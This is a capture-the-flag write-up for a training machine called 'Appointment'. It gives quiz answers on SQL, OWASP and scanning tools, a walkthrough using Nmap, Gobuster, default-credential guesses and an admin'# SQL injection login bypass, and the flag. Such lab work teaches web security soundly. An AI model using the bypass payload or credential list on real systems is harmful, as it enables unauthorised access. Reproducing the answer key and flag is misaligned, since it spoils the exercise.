# Appointment  

## Task 1  
Q: What does the acronym SQL stand for?  
A: structured query language  

## Task 2  
Q: What is one of the most common type of SQL vulnerabilities?  
A: sql injection  

## Task 3  
Q: What does PII stand for?  
A: personally identifiable information  

## Task 4  
Q: What is the 2021 OWASP Top 10 classification for this vulnerability?  
A: A03:2021-Injection  

## Task 5  
Q: What does Nmap report as the service and version that are running on port 80 of the target?  
A: Apache httpd 2.4.38 ((Debian))  

## Task 6  
Q: What is the standard port used for the HTTPS protocol?  
A: 443  

## Task 7  
Q: What is a folder called in web-application terminology?  
A: directory  

## Task 8  
Q: What is the HTTP response code is given for 'Not Found' errors?  
A: 404  

## Task 9  
Q: Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?  
A: dir  

## Task 10  
Q: What single character can be used to comment out the rest of a line in MySQL?  
A: #  

## Task 11  
Q: If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?  
A: Congratulations  

## SUBMIT FLAG  
``` text
1. scan open ports
    (1) [host] # nmap -sC -sV ${ip} -v
2. gobuster to see the big picture
    (1) [host] # gobuster dir -w ${wordlists_dir}/directory-list-2.3-small.txt -u http://${ip}/
    (2) no further information found.
3. browse http://${ip}/
4. try some easy guess
    (1) admin:admin
    (2) root:root
    (3) guest:guest
    (4) user:user
    (5) administrator:password
    (6) ...
5. try SQL injection
    (1) admin'#:abc
        $sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
        becomes
        $sql="SELECT * FROM users WHERE username='admin'#' AND password='abc'";
        turn the texts after '#' to comment, so that we just search 'admin', if admin is not found, we can try other account like administrator, root, etc.
```
A: e3d0796d002a446c0e622226f42e9672